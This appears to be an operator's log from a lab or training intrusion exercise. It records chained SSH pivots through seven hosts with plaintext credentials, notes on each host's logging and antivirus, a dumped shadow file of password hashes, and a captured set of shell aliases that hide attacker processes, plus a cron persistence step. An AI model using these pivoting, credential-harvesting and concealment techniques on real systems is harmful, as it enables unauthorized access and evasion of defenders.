@@ -1,0 +1,667 @@
+Date:2024-05-20 
+Start time: 0900
+End time: 1500
+
+------------------------
+SOM
+------------------------
+>T1: 10.50.34.234
+->T2: 10.20.169.10
+-->T3: 10.20.169.239
+---> T4: 192.186.169.133*
+----> T5: 192.186.169.201
+----> T6: 192.186.169.202
+----> T7: 192.186.169.203
+------------------------
+Creds
+------------------------
+engineer14::enshallah
+caisson14::tread_depth
+NOC_Admin14::AhmdLxu29D
+askar14::DaXedayLasarah
+
+
+=========================
+T1: >10.50.34.234
+=========================
+X-----------------------
+2024-05-20 09:00:25-- connection to T1; start vetting
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.34.234 -p 10123
+enshallah
+
+fa:16:3e:84:f4:d4
+10.20.169.195
+2024-05-20 09:01:49-- date
+Mon May 20 13:01:47 UTC 2024
+Mon May 20 13:01:47 UTC 2024
+
+4 S root        9052       1  0  80   0 - 54654 -      May17 ?        00:00:11   /usr/sbin/rsyslogd -n
+udp  UNCONN     0.0.0.0:34039                          0.0.0.0:*              users:(("rsyslogd",pid=9052,fd=5))                               
+-rw-rw-r--.  1 root   utmp    21120 May 20 13:02 wtmp
+-rw-rw-r--.  1 root   utmp   299300 May 20 13:02 lastlog
+-rw-------.  1 root   root    33167 May 20 13:03 messages
+-rw-------.  1 root   root    18408 May 20 13:04 secure
+/var/log/audit/audit.log
+/etc/rsyslog.conf
+*.* @10.50.22.142:514
+
+2024-05-20 09:09:31-- vetting complete; redirecting to T2
+
+2024-05-20 13:26:24-- start exit vetting
+2024-05-20 13:27:32-- exit vetting complete; disconnect from T1
+
+Logged In: wtmp, utmp, lastlog, messages, secure, audit.log, rsyslog
+------------------------X
+=========================
+
+=========================
+T2: ->10.20.169.10
+=========================
+X-----------------------
+2024-05-20 09:10:14-- connection to T2; start vetting
+ssh -S /tmp/T1 -O forward -L 127.0.0.1:2002:10.20.169.10:52203 dummy
+ssh -MS /tmp/T2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -p 2002
+tread_depth
+
+FA-16-3E-E1-88-18
+10.20.169.10
+2024-05-20 09:10:59-- date
+Mon 05/20/2024
+01:10 PM
+administrator         console             1  Active      none   5/20/2024 12:21 PM
+baretail.exe
+taskhostw.exe                 2800 Console                    1     10,052 K Unknown         CHATSERVER\Administrator            0:00:00 N/A
+cmd.exe                       2768 Console                    1      4,880 K Unknown         CHATSERVER\Administrator            0:00:00 N/A
+conhost.exe                   3772 Console                    1     13,544 K Unknown         CHATSERVER\Administrator            0:00:00 N/A
+baretail.exe                   788 Console                    1      9,468 K Unknown         CHATSERVER\Administrator            0:00:00 N/A
+C:\Users\Administrator\Downloads\baretail.exe  2768             788
+baretail run from cmd
+
+2024-05-20 09:38:53-- vetting complete; redirecting to T3
+2024-05-20 13:23:50-- start exit vetting
+2024-05-20 13:25:53-- exit vetting complete; disconnect from T2
+
+Logged In: Security, Application
+------------------------X
+=========================
+
+=========================
+T3: -->10.20.169.239
+=========================
+X-----------------------
+2024-05-20 09:39:28-- connection to T3; start vetting
+ssh -S /tmp/T2 -O forward -L 127.0.0.1:2003:10.20.169.239:52230 dummy
+ssh -MS /tmp/T3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -p 2003
+AhmdLxu29D
+
+eth0:
+fa:16:3e:b0:a1:1c
+10.20.169.239
+eth1:
+fa:16:3e:bd:3b:92
+192.186.169.206
+2024-05-20 09:41:08-- date
+Mon May 20 13:41:04 UTC 2024
+Mon May 20 13:41:04 UTC 2024
+
+5 S root      3552     1  0  80   0 - 29938 ?      May09 ?        00:00:00   /usr/sbin/rsyslogd -c4
+-rw-rw-r--  1 root     utmp       39552 May 20 13:40 wtmp
+-rw-rw-r--  1 root     utmp      299300 May 20 13:40 lastlog
+-rw-r-----  1 root     adm       176762 May 20 13:43 auth.log
+
+2024-05-20 09:46:47-- vetting complete-clean box; redirecting to T4
+
+2024-05-20 13:20:53-- start exit vetting
+2024-05-20 13:23:05-- exit vetting complete; disconnect from T3
+
+Logged In: wtmp, utmp, lastlog, auth.log, messages
+------------------------X
+=========================
+
+=========================
+T4: --->192.186.169.133*
+=========================
+X-----------------------
+2024-05-20 09:47:22-- connection to T4; start vetting
+ssh -S /tmp/T3 -O forward -L 127.0.0.1:2004:192.186.169.133:33157 dummy
+ssh -MS /tmp/T4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -p 2004
+DaXedayLasarah
+
+eth0:
+fa:16:3e:7c:75:a0
+10.101.169.38
+eth1:
+fa:16:3e:3b:98:c3
+192.186.169.133
+2024-05-20 09:49:35-- date
+Mon May 20 13:49:29 UTC 2024
+Mon May 20 13:49:29 UTC 2024
+
+/root/Sup3rS3cr3t
+-rw-r--r--. 1 root root 1014 May  9 20:23 S3cr3tSqu1r1.stuff
+-rw-r--r--. 1 root root   17 May  9 20:23 S3cr3tSqu1r12.stuff
+-rw-r--r--. 1 root root 1000 May  9 20:23 S3cr3tSqu1r2.stuff
+-rw-r--r--. 1 root root   12 May  9 20:23 S3cr3tSqu1r13.stuff
+-rw-r--r--. 1 root root 1000 May  9 20:23 S3cr3tSqu1r3.stuff
+-rw-r--r--. 1 root root   20 May  9 20:23 S3cr3tSqu1r14.stuff
+-rw-r--r--. 1 root root 1000 May  9 20:23 S3cr3tSqu1r4.stuff
+
+4 S root         896       1  0  80   0 - 60327 -      May09 ?        00:00:52   /usr/sbin/rsyslogd -n
+/var/account/pacct
+-rw-rw-r--.  1 root   utmp     20352 May 20 13:47 wtmp
+-rw-rw-r--.  1 root   utmp    299300 May 20 13:47 lastlog
+-rw-------.  1 root   root     34530 May 20 13:49 messages
+-rw-------.  1 root   root     10611 May 20 13:52 secure
+/var/log/audit/audit.log
+Current mode:                   permissive
+
+no survey
+2024-05-20 10:03:07-- vetting complete; redirecting to T5
+
+2024-05-20 13:18:26-- start exit vetting
+2024-05-20 13:20:21-- exit vetting complete; disconnect from T4
+
+Logged In: wtmp, utmp, lastlog, messages, secure, audit.log, pacct
+------------------------X
+=========================
+
+=========================
+T5: ---->192.186.169.201
+=========================
+X-----------------------
+2024-05-20 10:27:41-- connection to T5; start vetting
+ssh -S /tmp/T4 -O forward -L 127.0.0.1:2005:192.186.169.201:44714 dummy
+nc -nv 127.0.0.1 2005
+
+2024-05-20 10:29:15-- date
+Mon May 20 14:29:11 UTC 2024
+Mon May 20 14:29:11 UTC 2024
+radicle  pts/1    192.186.169.133  12:58    1:28m  0.06s  0.06s -bash
+5 S radicle   1589  1512  0  80   0 - 26997 -      12:58 ?        00:00:00       sshd: radicle@pts/1
+0 S radicle   1590  1589  0  80   0 -  5849 -      12:58 pts/1    00:00:00         -bash
+4 T root      1606  1590  0  80   0 - 17075 -      12:58 pts/1    00:00:00           sudo tcpdump -i lo -w /var/log/tcpdump.pcap
+4 S syslog     928     1  0  80   0 - 66820 -      12:50 ?        00:00:00   /usr/sbin/rsyslogd -n
+-rw-r-----   1 syslog    adm              25114 May 20 14:38 auth.log
+/etc/rsyslog.d/50-default.conf
+*.* @@129.168.169.186:514
+
+2024-05-20 11:14:42-- vetting complete; start survey
+group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog,ubuntu
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:ubuntu
+fax:x:21:
+voice:x:22:
+cdrom:x:24:ubuntu
+floppy:x:25:ubuntu
+tape:x:26:
+sudo:x:27:ubuntu
+audio:x:29:ubuntu
+dip:x:30:ubuntu
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:ubuntu
+sasl:x:45:
+plugdev:x:46:ubuntu
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+input:x:104:
+crontab:x:105:
+syslog:x:106:
+messagebus:x:107:
+lxd:x:108:ubuntu
+mlocate:x:109:
+uuidd:x:110:
+ssh:x:111:
+landscape:x:112:
+admin:x:113:
+netdev:x:114:ubuntu
+ubuntu:x:1000:
+
+passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+askar1:x:1001:27::/home/useraccounts/askar1:/bin/bash
+askar2:x:1002:27::/home/useraccounts/askar2:/bin/bash
+askar3:x:1003:27::/home/useraccounts/askar3:/bin/bash
+askar4:x:1004:27::/home/useraccounts/askar4:/bin/bash
+askar5:x:1005:27::/home/useraccounts/askar5:/bin/bash
+askar6:x:1006:27::/home/useraccounts/askar6:/bin/bash
+askar7:x:1007:27::/home/useraccounts/askar7:/bin/bash
+askar8:x:1008:27::/home/useraccounts/askar8:/bin/bash
+askar9:x:1009:27::/home/useraccounts/askar9:/bin/bash
+askar10:x:1010:27::/home/useraccounts/askar10:/bin/bash
+askar11:x:1011:27::/home/useraccounts/askar11:/bin/bash
+askar12:x:1012:27::/home/useraccounts/askar12:/bin/bash
+askar13:x:1013:27::/home/useraccounts/askar13:/bin/bash
+askar14:x:1014:27::/home/useraccounts/askar14:/bin/bash
+askar15:x:1015:27::/home/useraccounts/askar15:/bin/bash
+askar16:x:1016:27::/home/useraccounts/askar16:/bin/bash
+askar17:x:1017:27::/home/useraccounts/askar17:/bin/bash
+askar18:x:1018:27::/home/useraccounts/askar18:/bin/bash
+askar19:x:1019:27::/home/useraccounts/askar19:/bin/bash
+askar20:x:1020:27::/home/useraccounts/askar20:/bin/bash
+askar21:x:1021:27::/home/useraccounts/askar21:/bin/bash
+askar22:x:1022:27::/home/useraccounts/askar22:/bin/bash
+askar23:x:1023:27::/home/useraccounts/askar23:/bin/bash
+radicle:x:1025:27::/home/useraccounts/radicle:/bin/bash
+
+shadow - cant get; no sudo
+ls -latr /home/useraccounts
+total 108
+drwxr-xr-x  4 root    root 4096 May 20 12:14 ..
+drwxr-xr-x  2 askar1  sudo 4096 May 20 12:14 askar1
+drwxr-xr-x  2 askar2  sudo 4096 May 20 12:14 askar2
+drwxr-xr-x  2 askar3  sudo 4096 May 20 12:14 askar3
+drwxr-xr-x  2 askar4  sudo 4096 May 20 12:14 askar4
+drwxr-xr-x  2 askar5  sudo 4096 May 20 12:14 askar5
+drwxr-xr-x  2 askar6  sudo 4096 May 20 12:14 askar6
+drwxr-xr-x  2 askar7  sudo 4096 May 20 12:14 askar7
+drwxr-xr-x  2 askar8  sudo 4096 May 20 12:14 askar8
+drwxr-xr-x  2 askar9  sudo 4096 May 20 12:14 askar9
+drwxr-xr-x  2 askar10 sudo 4096 May 20 12:14 askar10
+drwxr-xr-x  2 askar11 sudo 4096 May 20 12:14 askar11
+drwxr-xr-x  2 askar12 sudo 4096 May 20 12:14 askar12
+drwxr-xr-x  2 askar13 sudo 4096 May 20 12:14 askar13
+drwxr-xr-x  2 askar14 sudo 4096 May 20 12:14 askar14
+drwxr-xr-x  2 askar15 sudo 4096 May 20 12:14 askar15
+drwxr-xr-x  2 askar16 sudo 4096 May 20 12:14 askar16
+drwxr-xr-x  2 askar17 sudo 4096 May 20 12:14 askar17
+drwxr-xr-x  2 askar18 sudo 4096 May 20 12:14 askar18
+drwxr-xr-x  2 askar19 sudo 4096 May 20 12:14 askar19
+drwxr-xr-x  2 askar20 sudo 4096 May 20 12:14 askar20
+drwxr-xr-x  2 askar21 sudo 4096 May 20 12:14 askar21
+drwxr-xr-x  2 askar22 sudo 4096 May 20 12:15 askar22
+drwxr-xr-x  2 askar23 sudo 4096 May 20 12:15 askar23
+drwxr-xr-x  2    1024 sudo 4096 May 20 12:43 askar
+drwxr-xr-x 27 root    root 4096 May 20 12:48 .
+drwxr-xr-x  4 radicle sudo 4096 May 20 13:00 radicle
+
+2024-05-20 11:21:25-- survey complete; start exit vetting
+2024-05-20 11:23:29-- exit vet complete; disconnect from T5
+
+Logged In: auth.log, rsyslog
+-----------------------X
+=========================
+back to T4
+=========================
+T6: ---->192.186.169.202
+=========================
+X-----------------------
+2024-05-20 11:26:21-- connection to T6; start vetting
+ssh -S /tmp/T4 -O forward -L 127.0.0.1:2006:192.186.169.202:33715 dummy
+ssh -MS /tmp/T6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -p 2006
+DaXedayLasarah
+
+root     tty7     :0     12:07    3:35m  3.59s  3.59s /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+2024-05-20 11:31:28-- date
+Mon May 20 15:31:26 UTC 2024
+Mon May 20 15:31:26 UTC 2024
+
+drwxr-xr-x   2 root root  4096 May 20 13:06 .malice
+/.malice/Alias
+#Malicious Alice back at it again with the white Vans
+alias malice="echo 'Malicious Alice is in your house, eating your chips'"
+alias ps='f(){ ps "$@" | grep -v netcat | grep -v m.alice | grep -v 13666 | grep -v malice  ; unset -f f; }; f'
+alias netstat='f(){ netstat "$@" | grep -v m.alice | grep -v 13666 | grep -v malice   ; unset -f f; }; f'
+alias ls='f(){ ls "$@" | grep -v m.alice | grep -v 13666 | grep -v malice ; unset -f f; }; f'
+alias ss='f(){ ss "$@" | grep -v m.alice | grep -v 13666 | grep -v malice  ; unset -f f; }; f'
+alias w='f(){ w "$@" | grep -v m.alice | grep -v 13666 | grep -v malice  ; unset -f f; }; f'
+alias cat='f(){ cat "$@" | grep -v m.alice | grep -v 13666 | grep -v malice ; unset -f f; }; f'
+alias sudo='f(){ sudo "$@" | grep -v m.alice | grep -v 13666 | grep -v malice ; unset -f f; }; f'
+
+a0c66aa022cfb2cb7a2c2f4f7a3c4fd1  /.malice/malice.sh
+
+4 S root      4659     1  0  80   0 - 62517 -      11:58 ?        00:00:00   /usr/sbin/rsyslogd -n
+4 S root      5078     1  0  80   0 - 72496 -      12:07 ?        00:00:00   /usr/sbin/lightdm
+4 S root      5085  5078  0  80   0 - 98686 -      12:07 tty7     00:00:03     /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+udp        0      0 0.0.0.0:45258           0.0.0.0:*                           4659/rsyslogd       
+/etc/rsyslog.conf
+*.=info;*.=notice;*.=warn;\
+        auth,authpriv.none;\
+        cron,daemon.none;\
+        mail,news.none          @remote-host:1514
+192.186.169.201 remote-host
+
+-rw-r-----  1 root              adm  206466 May 20 15:38 syslog
+-rw-r-----  1 root              adm  153540 May 20 15:38 daemon.log
+-rw-rw-r--  1 root              utmp  10368 May 20 15:38 wtmp
+-rw-rw-r--  1 root              utmp 299300 May 20 15:38 lastlog
+-rw-r-----  1 root              adm   26793 May 20 15:41 auth.log
+
+mv /.malice/malice.cron /etc/cron.hourly/
+#!/bin/bash
+/.malice/malice.sh
+
+2024-05-20 12:31:37-- vetting complete; start survey
+
+shadow
+root:$6$pZAkMJXh$II5UUiyAFaLUSHp1SpJwBQTPJUI7sQ.7mtgbIeTb3heRAeN95Xi/b3Vzf5cEbGTlG1VIIbt/7LTz3IIQAPvXs1:19863:0:99999:7:::
+daemon:*:17575:0:99999:7:::
+bin:*:17575:0:99999:7:::
+sys:*:17575:0:99999:7:::
+sync:*:17575:0:99999:7:::
+games:*:17575:0:99999:7:::
+man:*:17575:0:99999:7:::
+lp:*:17575:0:99999:7:::
+mail:*:17575:0:99999:7:::
+news:*:17575:0:99999:7:::
+uucp:*:17575:0:99999:7:::
+proxy:*:17575:0:99999:7:::
+www-data:*:17575:0:99999:7:::
+backup:*:17575:0:99999:7:::
+list:*:17575:0:99999:7:::
+irc:*:17575:0:99999:7:::
+gnats:*:17575:0:99999:7:::
+nobody:*:17575:0:99999:7:::
+systemd-timesync:*:17575:0:99999:7:::
+systemd-network:*:17575:0:99999:7:::
+systemd-resolve:*:17575:0:99999:7:::
+systemd-bus-proxy:*:17575:0:99999:7:::
+unscd:*:17575:0:99999:7:::
+ntp:*:17575:0:99999:7:::
+_apt:*:17575:0:99999:7:::
+messagebus:*:17575:0:99999:7:::
+sshd:*:17575:0:99999:7:::
+debian:!*:17575:0:99999:7:::
+rtkit:*:17581:0:99999:7:::
+usbmux:*:17581:0:99999:7:::
+speech-dispatcher:!:17581:0:99999:7:::
+lightdm:*:17581:0:99999:7:::
+pulse:*:17581:0:99999:7:::
+avahi:*:17581:0:99999:7:::
+saned:*:17581:0:99999:7:::
+askar1:$1$r/Kk3ayd$vyVIj7fJK4YJ1QPVVwSzD1:19863:0:99999:7:::
+askar2:$1$u.wbHxqd$UK6ZZOWZZfK4XE57FSJtW0:19863:0:99999:7:::
+askar3:$1$/0HWIo7x$EgY2B41RurXafVg5k97N21:19863:0:99999:7:::
+askar4:$1$4m6vyuBw$NKbYV7pEJiw7hAwlXfaFv1:19863:0:99999:7:::
+askar5:$1$Io/XkAzi$CA/YFT1ArK/ViM7yEAMkt/:19863:0:99999:7:::
+askar6:$1$JCHy60Td$uU.Yh5cNeHhfMJCJyiaYU.:19863:0:99999:7:::
+askar7:$1$bC1ezrMp$TDNcdR5l0Epc/4SFhNeoV.:19863:0:99999:7:::
+askar8:$1$q9k7uHaP$oOw5.n2ZKocYPRIIq.SPf/:19863:0:99999:7:::
+askar9:$1$zuMR7z4p$wlM5OdUuQeK8PXwcxKZk11:19863:0:99999:7:::
+askar10:$1$DCMIpXeu$ydKoHv.7.z8oDzRwKPVDV1:19863:0:99999:7:::
+askar11:$1$wS0XrbaS$JvT5nnTzTMcuawILVIOT51:19863:0:99999:7:::
+askar12:$1$nmEaK.LM$.Irc/ZyA.Q13ah3iHd/0A0:19863:0:99999:7:::
+askar13:$1$ADFEIGoU$L9N63DeOApEqENt0DZm4H1:19863:0:99999:7:::
+askar14:$1$Ed.TkXF1$8mtvWNVNyt.ffXyo3nD0Y/:19863:0:99999:7:::
+askar15:$1$1CIx5Fim$p0RLgAEhJZc7BwgcKwjPI.:19863:0:99999:7:::
+askar16:$1$GEkX1TH0$AyNs6LF0GlQCZvZT55G0y0:19863:0:99999:7:::
+askar17:$1$w/Wn.CeD$ildHrroWaVdnZLwBFe0LI.:19863:0:99999:7:::
+askar18:$1$rqCqjUL0$orWCEDutplShgwZ/hiCn1/:19863:0:99999:7:::
+askar19:$1$MGAN5Wpy$bSLqU1KzzI9rT3jh0JpM41:19863:0:99999:7:::
+askar20:$1$859ba7dX$X3KVvwpkh49fpcxvVHFRZ1:19863:0:99999:7:::
+askar21:$1$9rSnn2by$1loT0TosG1rQvH/ivgIWg.:19863:0:99999:7:::
+askar22:$1$lGHj5MJd$WvWKvNGICebMxsyGzz4vY.:19863:0:99999:7:::
+askar23:$1$y5gYq.Mx$7ffWR//D3pw/s9P23HMhT.:19863:0:99999:7:::
+radicle:$1$6XXmnDR4$DZ1euxfSssUH9nM07FI4W0:19863:0:99999:7:::
+
+passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+unscd:x:104:107::/var/lib/unscd:/bin/false
+ntp:x:105:109::/home/ntp:/bin/false
+_apt:x:106:65534::/nonexistent:/bin/false
+messagebus:x:107:110::/var/run/dbus:/bin/false
+sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
+debian:x:1000:1000:Cloud-init-user,,,:/home/debian:/bin/bash
+rtkit:x:109:113:RealtimeKit,,,:/proc:/bin/false
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+lightdm:x:112:115:Light Display Manager:/var/lib/lightdm:/bin/false
+pulse:x:113:116:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+avahi:x:114:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+saned:x:115:120::/var/lib/saned:/bin/false
+askar1:x:1001:27::/home/useraccounts/askar1:/bin/bash
+askar2:x:1002:27::/home/useraccounts/askar2:/bin/bash
+askar3:x:1003:27::/home/useraccounts/askar3:/bin/bash
+askar4:x:1004:27::/home/useraccounts/askar4:/bin/bash
+askar5:x:1005:27::/home/useraccounts/askar5:/bin/bash
+askar6:x:1006:27::/home/useraccounts/askar6:/bin/bash
+askar7:x:1007:27::/home/useraccounts/askar7:/bin/bash
+askar8:x:1008:27::/home/useraccounts/askar8:/bin/bash
+askar9:x:1009:27::/home/useraccounts/askar9:/bin/bash
+askar10:x:1010:27::/home/useraccounts/askar10:/bin/bash
+askar11:x:1011:27::/home/useraccounts/askar11:/bin/bash
+askar12:x:1012:27::/home/useraccounts/askar12:/bin/bash
+askar13:x:1013:27::/home/useraccounts/askar13:/bin/bash
+askar14:x:1014:27::/home/useraccounts/askar14:/bin/bash
+askar15:x:1015:27::/home/useraccounts/askar15:/bin/bash
+askar16:x:1016:27::/home/useraccounts/askar16:/bin/bash
+askar17:x:1017:27::/home/useraccounts/askar17:/bin/bash
+askar18:x:1018:27::/home/useraccounts/askar18:/bin/bash
+askar19:x:1019:27::/home/useraccounts/askar19:/bin/bash
+askar20:x:1020:27::/home/useraccounts/askar20:/bin/bash
+askar21:x:1021:27::/home/useraccounts/askar21:/bin/bash
+askar22:x:1022:27::/home/useraccounts/askar22:/bin/bash
+askar23:x:1023:27::/home/useraccounts/askar23:/bin/bash
+radicle:x:1024:27::/home/useraccounts/radicle:/bin/bash
+
+group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:pulse
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-timesync:x:102:
+systemd-network:x:103:
+systemd-resolve:x:104:
+systemd-bus-proxy:x:105:
+input:x:106:
+unscd:x:107:
+crontab:x:108:
+ntp:x:109:
+messagebus:x:110:
+netdev:x:111:
+ssh:x:112:
+debian:x:1000:
+rtkit:x:113:
+lpadmin:x:114:
+lightdm:x:115:
+pulse:x:116:
+pulse-access:x:117:
+scanner:x:118:saned
+avahi:x:119:
+saned:x:120:
+
+2024-05-20 12:41:51-- survey complete; start exit vetting
+2024-05-20 12:43:26-- exit vetting complete; disconnect from T6
+
+Logged In: utmp, wtmp, lastlog, auth.log, syslog, daemon.log
+-----------------------X
+=========================
+Back to T4
+=========================
+T7: ---->192.186.169.203
+=========================
+X-----------------------
+2024-05-20 12:44:31-- connection to T7; start vetting
+ssh -S /tmp/T4 -O forward -L 127.0.0.1:2007:192.186.169.203:33715 dummy
+ssh -MS /tmp/T7 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -p 2007
+DaXedayLasarah
+
+FA-16-3E-AD-85-90
+192.186.169.203
+2024-05-20 12:45:31-- date
+Mon 05/20/2024                                                                                                                  
+04:45 PM 
+avp.exe                       8344 Services                   0      9,568 K Unknown         NT AUTHORITY\SYSTEM                
+avp.exe                       8824 Services                   0      5,596 K Unknown         NT AUTHORITY\SYSTEM                
+avp.exe                       9712 Services                   0     85,672 K Unknown         NT AUTHORITY\SYSTEM                
+HKEY_LOCAL_MACHINE\software\KasperskyLab
+c:\kaspersky.exe
+"c:\Program Files (x86)\Kaspersky Lab"
+"c:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.17"
+
+2024-05-20 13:08:33-- vetting complete; start survey
+Admin                    Administrator            askar1                                                                        
+askar10                  askar11                  askar12                                                                       
+askar13                  askar14                  askar15                                                                       
+askar16                  askar17                  askar18                                                                       
+askar19                  askar2                   askar20                                                                       
+askar21                  askar22                  askar23                                                                       
+askar3                   askar4                   askar5                                                                        
+askar6                   askar7                   askar8                                                                        
+askar9                   cloudbase-init           DefaultAccount                                                                
+Guest                    sshd                     WDAGUtilityAccount 
+
+*Access Control Assistance Operators                                                                                            
+*Administrators                                                                                                                 
+*Backup Operators                                                                                                               
+*Cryptographic Operators                                                                                                        
+*Device Owners                                                                                                                  
+*Distributed COM Users                                                                                                          
+*Event Log Readers                                                                                                              
+*Guests                                                                                                                         
+*Hyper-V Administrators                                                                                                         
+*IIS_IUSRS                                                                                                                      
+*Network Configuration Operators                                                                                                
+*Performance Log Users                                                                                                          
+*Performance Monitor Users                                                                                                      
+*Power Users                                                                                                                    
+*Remote Desktop Users                                                                                                           
+*Remote Management Users                                                                                                        
+*Replicator                                                                                                                     
+*System Managed Accounts Group                                                                                                  
+*Users        
+
+Admin                                                                                                                           
+Administrator                                                                                                                   
+askar1                                                                                                                          
+askar10                                                                                                                         
+askar11                                                                                                                         
+askar12                                                                                                                         
+askar13                                                                                                                         
+askar14                                                                                                                         
+askar15                                                                                                                         
+askar16                                                                                                                         
+askar17                                                                                                                         
+askar18                                                                                                                         
+askar19                                                                                                                         
+askar2                                                                                                                          
+askar20                                                                                                                         
+askar21                                                                                                                         
+askar22                                                                                                                         
+askar23                                                                                                                         
+askar3                                                                                                                          
+askar4                                                                                                                          
+askar5                                                                                                                          
+askar6                                                                                                                          
+askar7                                                                                                                          
+askar8                                                                                                                          
+askar9                                                                                                                          
+cloudbase-init  
+
+2024-05-20 13:15:08-- survey complete; start exit vetting
+2024-05-20 13:16:50-- exit vetting complete; disconnect from T7
+
+Logged In: Security, Application
+-----------------------X
+=========================
